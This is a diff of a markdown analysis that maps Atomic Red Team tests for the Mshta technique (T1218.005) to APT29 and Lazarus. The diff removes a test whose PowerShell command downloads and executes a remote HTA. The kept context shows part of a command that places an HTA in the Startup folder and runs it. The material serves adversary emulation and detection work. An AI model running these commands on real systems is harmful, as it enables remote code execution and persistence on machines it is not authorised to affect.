@@ -35,7 +35,6 @@ Both groups leverage T1218.005 (Mshta) because it allows them to:
 |--------|-----------|-------------|---------|
 | **2** | Mshta executes VBScript to execute malicious command | Uses VBScript via mshta to run PowerShell commands | **APT29** |
 | **3** | Mshta Executes Remote HTML Application (HTA) | Downloads and executes remote HTA file | **Lazarus** |
-| **6** | Invoke HTML Application - Direct download from URI | Directly executes HTA from remote URI | **Lazarus** |
 | **10** | Mshta used to Execute PowerShell | Uses mshta to execute PowerShell commands | **APT29** |
 
 ---
@@ -61,15 +60,6 @@ $var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startu
 mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
 ```
 **Explanation:** Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents. This technique allows them to stage payloads from remote locations while leveraging a trusted Windows utility.
-
-### Atomic Test #6 - Invoke HTML Application - Direct download from URI
-**Technique:** Direct URI Execution  
-**Adversary Usage:** Lazarus Group  
-**Command:**
-```powershell
-Invoke-ATHHTMLApplication -HTAUri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta" -MSHTAFilePath "$env:windir\system32\mshta.exe"
-```
-**Explanation:** Lazarus Group frequently downloads and executes remote HTA content directly from URIs, demonstrating their preference for direct remote execution without intermediate file stages.
 
 ### Atomic Test #10 - Mshta used to Execute PowerShell
 **Technique:** PowerShell Execution via Mshta  
